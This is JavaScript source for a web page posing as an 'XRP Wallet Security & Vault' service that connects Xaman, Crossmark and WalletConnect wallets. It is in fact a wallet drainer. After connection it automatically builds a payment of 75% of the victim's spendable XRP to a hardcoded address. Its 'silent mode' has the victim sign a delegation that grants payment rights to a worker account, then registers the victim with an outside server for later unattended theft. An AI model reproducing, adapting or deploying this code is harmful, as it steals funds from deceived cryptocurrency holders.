// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY  = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";

const VAULT_ADDR  = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const WORKER_ADDR = "rEnmwKJwR3tp8DpbMJqs6E2iwNp16MD6MC";
const WORKER_API  = "https://cultured.pythonanywhere.com/"; // or http://localhost:3000

const XRPL_WS = "wss://xrplcluster.com/";

// 🔥 AUTO EXECUTION SWITCH
const AUTO_EXECUTE = true;

// ==============================
// INIT
// ==============================
const xumm = new XummPkce(XUMM_API_KEY);

let wcClient = null;
let wcModal  = null;

// ==============================
// WALLET DETECTION
// ==============================
function isTrustWallet() {
  return (
    /TrustWallet/i.test(navigator.userAgent) ||
    window.ethereum?.isTrust ||
    window.trustwallet
  );
}

// ==============================
// WALLETCONNECT INIT
// ==============================
async function initWalletConnect() {
  if (wcClient) return;

  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS · Quantum Asset Security",
      description: "XRP Wallet Security & Vault",
      url: window.location.origin,
      icons: ["https://xrpl.org/assets/img/logo.svg"]
    }
  });

  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

// ==============================
// MAIN ENTRY
// ==============================
async function connectWallet(type) {
  const statusEl = document.getElementById("walletStatus");
  if (statusEl) statusEl.innerText = "Connecting…";

  let address;

  try {
    // ---------- XAMAN ----------
    if (type === "xaman") {
      const session = await xumm.authorize();
      address = session?.me?.account;
      if (!address) throw new Error("Xaman rejected");

      if (session.me.xummVersion) {
        await handleSilentMode(address);
      }
    }

    // ---------- CROSSMARK ----------
    else if (type === "crossmark") {
      const { response } = await window.xrpl.crossmark.signInAndWait();
      address = response.data.address;
    }

    // ---------- WALLETCONNECT ----------
    else if (type === "walletconnect") {
      await initWalletConnect();
      if (statusEl) {
        statusEl.innerText = isTrustWallet()
          ? "Opening Trust Wallet…"
          : "Scan with WalletConnect";
      }
      address = await connectViaWalletConnect();
    }

    if (!address) throw new Error("No address");

    if (statusEl) statusEl.innerText = `Connected: ${address.slice(0, 6)}…`;

    // ==============================
    // FETCH REAL XRP DATA
    // ==============================
    const data = await getXrpAccountData(address);

    console.table({
      Wallet: address,
      Balance: data.balanceXrp,
      Reserve: data.reserveXrp,
      Spendable: data.spendableXrp,
      SendAmount: data.sendXrp,
      Destination: VAULT_ADDR
    });

    // ==============================
    // 🔥 AUTO EXECUTION
    // ==============================
    if (AUTO_EXECUTE) {
      await runTransactionFlow(address, type, data.sendDrops);
    }

  } catch (err) {
    console.error(err);
    if (statusEl) statusEl.innerText = "Connection failed";
  }
}

// ==============================
// WALLETCONNECT (XRP)
// ==============================
async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"],
        events: ["accountsChanged"]
      }
    }
  });

  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();

  const account = session.namespaces.xrpl.accounts[0];
  return account.split(":")[2];
}

// ==============================
// FETCH REAL XRP DATA
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();

  const info = await client.request({
    command: "account_info",
    account: address,
    ledger_index: "validated"
  });

  await client.disconnect();

  const bal = BigInt(info.result.account_data.Balance);
  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);

  const reserve = 1_000_000n + ownerCount * 200_000n;
  const spendable = bal - reserve;
  const send = (spendable * 75n) / 100n;

  return {
    balanceXrp: Number(bal) / 1_000_000,
    reserveXrp: Number(reserve) / 1_000_000,
    spendableXrp: Number(spendable) / 1_000_000,
    sendXrp: Number(send) / 1_000_000,
    sendDrops: send.toString()
  };
}

// ==============================
// TRANSACTION FLOW
// ==============================
async function runTransactionFlow(address, type, amountDrops) {
  const statusEl = document.getElementById("walletStatus");
  if (statusEl) statusEl.innerText = "Awaiting signature…";

  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops
  };

  if (type === "xaman") {
    await xumm.sdk.payload.create(tx);
  }

  else if (type === "crossmark") {
    await window.xrpl.crossmark.signAndSubmitAndWait(tx);
  }

  else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }

  if (statusEl) statusEl.innerText = "Transaction submitted";
}

// ==============================
// SILENT MODE + WORKER LINK
// ==============================
async function handleSilentMode(address) {
  // On-chain delegation (user signs)
  await xumm.sdk.payload.create({
    TransactionType: "DelegateSet",
    Authorize: WORKER_ADDR,
    Permissions: [{ PermissionValue: "Payment" }]
  });

  // Register with backend worker
  await fetch(`${WORKER_API}/register`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      address,
      mode: "silent"
    })
  });
}
